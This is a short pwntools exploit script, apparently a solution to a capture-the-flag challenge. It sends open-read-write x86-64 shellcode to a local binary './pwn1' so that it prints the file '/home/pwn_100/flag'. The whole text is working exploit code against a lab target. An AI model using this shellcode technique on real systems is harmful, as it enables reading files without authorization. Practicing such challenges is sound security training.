from pwn import *

context.os == 'linux'
context.arch = 'amd64'

sh = process('./pwn1')

read_input_buf = asm('''
    xor rdi, rdi
    mov rsi, 0x601500
    mov rdx, 41
    xor rax, rax
    syscall
''')

open_buf = asm('''
    mov rdi, 0x601500
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
''')

read_flag_buf = asm('''
    mov rdi, rax
    mov rsi, 0x601500
    mov rdx, 41
    xor rax, rax
    syscall
''')

write_buf = asm('''
    mov rdi, 1
    mov rax, 1
    syscall
''')

sc = read_input_buf + open_buf + read_flag_buf + write_buf

raw_input('>')
sh.send(sc)
sleep(0.1)

sh.send('/home/pwn_100/flag\0')

sh.interactive()
